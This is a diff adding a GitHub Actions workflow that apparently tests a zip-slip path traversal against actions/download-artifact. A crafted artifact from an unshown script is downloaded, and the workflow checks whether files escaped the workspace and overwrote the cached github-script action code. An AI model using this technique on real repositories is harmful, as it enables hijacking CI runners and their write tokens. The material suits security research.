@@ -1,0 +1,57 @@
+name: slip2
+on:
+  workflow_dispatch:
+
+permissions:
+  actions: read
+  contents: read
+
+jobs:
+  produce:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: forge and upload crafted zip
+        run: bash ./slip2.sh
+
+  consume:
+    needs: produce
+    runs-on: ubuntu-latest
+    permissions:
+      actions: read
+      contents: read
+      pull-requests: write
+    steps:
+      - name: Download artifact (same default path as target workflow)
+        uses: actions/download-artifact@v8
+        with:
+          name: slip2-art
+          run-id: ${{ github.run_id }}
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Inspect traversal
+        if: always()
+        run: |
+          echo "TEMP=$RUNNER_TEMP"
+          echo "WS=$GITHUB_WORKSPACE"
+          echo "--- workspace ---"; ls -la "$GITHUB_WORKSPACE" || true
+          echo "--- repo dir (one up) ---"; ls -la "$(dirname "$GITHUB_WORKSPACE")" || true
+          echo "--- work dir (two up) ---"; ls -la /home/runner/work || true
+          echo "--- marker hijack ---"
+          ls -la /home/runner/work/HIJACK_MARKER.txt 2>/dev/null && cat /home/runner/work/HIJACK_MARKER.txt || echo no-marker-yet
+          echo "--- hijacked action file ---"
+          ls -la /home/runner/work/_actions/actions/github-script/v9/dist/index.js 2>/dev/null || true
+          head -c 200 /home/runner/work/_actions/actions/github-script/v9/dist/index.js 2>/dev/null || true
+          echo
+          for f in /home/runner/work/UP2.txt "$(dirname "$GITHUB_WORKSPACE")/UP1.txt" /home/runner/work/UP3.txt "$GITHUB_WORKSPACE/sub/../../../UP3.txt"; do
+            echo "check $f"; cat "$f" 2>/dev/null || echo missing
+          done
+
+      - name: github-script (hijack check)
+        if: always()
+        uses: actions/github-script@v9
+        with:
+          script: |
+            console.log('ORIGINAL-GITHUB-SCRIPT-RAN')
+            const fs = require('fs')
+            console.log('MARKER=' + (fs.existsSync('/home/runner/work/HIJACK_MARKER.txt') ? fs.readFileSync('/home/runner/work/HIJACK_MARKER.txt','utf8').trim() : 'no-marker'))
